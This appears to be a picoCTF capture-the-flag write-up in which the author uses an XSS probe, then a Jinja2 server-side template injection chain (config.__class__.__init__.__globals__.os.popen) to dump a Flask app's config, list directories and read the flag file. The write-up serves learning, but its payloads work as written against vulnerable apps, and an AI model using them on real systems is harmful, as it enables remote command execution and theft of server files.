<script>alert(1)</script> This was for recon, to see if what we submit will run on the backend. 

Tried inserting {{7*7}} to check for SSTI, and 49 returned. Probably using Twig (PHP) or Jinja (Python).

{{ config }} showed me all of the site configurations, including the root directory name.

{{config.items()}} showed me the list more organized


***********Output of the config.items*************

dict_items([('DEBUG', False), ('TESTING', False), ('PROPAGATE_EXCEPTIONS', None), ('SECRET_KEY', None), ('PERMANENT_SESSION_LIFETIME', datetime.timedelta(days=31)), 
('USE_X_SENDFILE', False), ('SERVER_NAME', None), ('APPLICATION_ROOT', '/'), ('SESSION_COOKIE_NAME', 'session'), ('SESSION_COOKIE_DOMAIN', None), 
('SESSION_COOKIE_PATH', None), ('SESSION_COOKIE_HTTPONLY', True), ('SESSION_COOKIE_SECURE', False), ('SESSION_COOKIE_SAMESITE', None), ('SESSION_REFRESH_EACH_REQUEST', True), 
('MAX_CONTENT_LENGTH', None), ('SEND_FILE_MAX_AGE_DEFAULT', None), ('TRAP_BAD_REQUEST_ERRORS', None), ('TRAP_HTTP_EXCEPTIONS', False), ('EXPLAIN_TEMPLATE_LOADING', False), 
('PREFERRED_URL_SCHEME', 'http'), ('TEMPLATES_AUTO_RELOAD', None), ('MAX_COOKIE_SIZE', 4093)])

**************************************************

Since this works, I can assume it is Jinja2 and Flask

Compiled payload I entered:
{{ config.__class__.__init__.__globals__.os.popen('ls /').read() }}
This displayed all files in the root directory.

bin boot challenge dev etc home lib lib32 lib64 libx32 media mnt opt proc root run sbin srv sys tmp usr var

{{ config.__class__.__init__.__globals__.os.popen('ls /root').read() }} gave nothing, so I don't have read privileges as root

{{ config.__class__.__init__.__globals__.os.popen('ls /challenge').read() }}

Output of the above command:
__pycache__ app.py flag requirements.txt

So I'm gonna try and cat this

{{ config.__class__.__init__.__globals__.os.popen('cat /challenge/flag').read() }}

picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_ae48ad61}

**End Game Review**
This flag utilized Server Side Template Injection and exploited the Jinja2 framework to access the backend directory. The recon was simple, as above, I was able to make an alert reflect to the 
user, meaning that we had a reflected XSS. Above is the list of commands I used to piece together the file directory and eventually draw conclusions on how I was going to exploit the site, and 
eventually get the flag.


